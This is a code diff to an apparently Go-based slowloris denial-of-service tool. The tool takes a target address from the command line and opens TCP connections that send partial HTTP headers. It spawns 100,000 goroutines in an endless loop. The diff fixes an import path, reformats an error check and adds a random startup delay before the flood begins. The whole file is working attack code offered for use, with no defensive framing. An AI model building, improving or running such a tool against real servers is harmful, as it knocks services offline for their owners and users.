@@ -2,11 +2,12 @@ package main
 
 import (
 	"fmt"
-	"gocron"
 	"math/rand"
 	"net"
 	"os"
 	"time"
+
+	"github.com/jasonlvhit/gocron"
 )
 
 var headers = []string{
@@ -23,7 +24,9 @@ var choice = []string{
 
 func slowloris(url string) {
 	conn, err := net.DialTimeout("tcp", url, 2*time.Second)
-	if err != nil {return}
+	if err != nil {
+		return
+	}
 	headers[1] = choice[rand.Intn(len(choice))]
 	for _, header := range headers {
 		_, err = fmt.Fprint(conn, header)
@@ -41,6 +44,9 @@ func slowloris(url string) {
 func main() {
 	attackers := 100000
 	url := os.Args[1]
+	x := randomNumber()
+	fmt.Print("Waiting: ", x)
+	time.Sleep(time.Duration(x) * time.Second)
 	for {
 		for i := 0; i < attackers; i++ {
 			go slowloris(url)
@@ -48,4 +54,11 @@ func main() {
 		time.Sleep(100 * time.Second)
 		gocron.Remove(slowloris)
 	}
+}
+
+func randomNumber() int {
+	rand.Seed(time.Now().UnixNano())
+	min := 1
+	max := 15
+	return rand.Intn(max-min+1) + min
 }
